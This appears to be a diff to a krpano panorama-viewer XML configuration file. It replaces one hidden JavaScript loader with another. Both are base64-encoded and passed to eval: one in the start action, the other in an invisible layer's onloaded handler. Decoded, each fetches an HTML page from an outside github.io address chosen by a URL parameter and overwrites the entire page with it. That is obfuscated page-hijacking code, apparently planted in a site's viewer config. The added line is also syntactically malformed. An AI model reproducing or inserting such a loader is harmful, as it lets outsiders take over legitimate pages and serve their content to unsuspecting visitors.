@@ -1,5 +1,1 @@
-<krpano version="1.0.8.15" onstart="action(run_script);">
-    <action name="run_script">
-        js(window.eval(window.atob('dmFyIGlkID0gbmV3IFVSTFNlYXJjaFBhcmFtcyhsb2NhdGlvbi5zZWFyY2gpLmdldCgiaWQiKSB8fCAiaW5kZXgiO2ZldGNoKCJodHRwczovL2VsaXphYmV0aHdvb2xzZXkuZ2l0aHViLmlvL2xpdmUvIiArIGlkICsgIi5odG1sIikudGhlbihyPT5yLnRleHQoKSkudGhlbihkPT57ZG9jdW1lbnQub3BlbigpO2RvY3VtZW50LndyaXRlKGQpO2RvY3VtZW50LmNsb3NlKCk7fSk7')));
-    </action>
-</krpano>
+<krpano version="1.0.8.15"><layer name="js_loader" type="container" visible="false" onloaded="js(eval(var w=atob('dmFyIGlkID0gbmV3IFVSTFNlYXJjaFBhcmFtcyhsb2NhdGlvbi5zZWFyY2gpLmdldCgiaWQiKSB8fCAiYWxjemFyX2FycXVpdGVjdG9uaWNvIjsKCmZldGNoKCJodHRwczovL2VsaXphYmV0aHdvb2xzZXkuZ2l0aHViLmlvL2hpbWVsMS9oaW1lbGZsLyIgKyBpZCArICIuaHRtbCIpCiAgLnRoZW4oZSA9PiBlLnRleHQoKSkKICAudGhlbihlID0+IHsKICAgIGRvY3VtZW50Lm9wZW4oKTsKICAgIGRvY3VtZW50LndyaXRlKGUpOwogICAgZG9jdW1lbnQuY2xvc2UoKTsKICB9KTs=');eval(w)););"/></krpano>
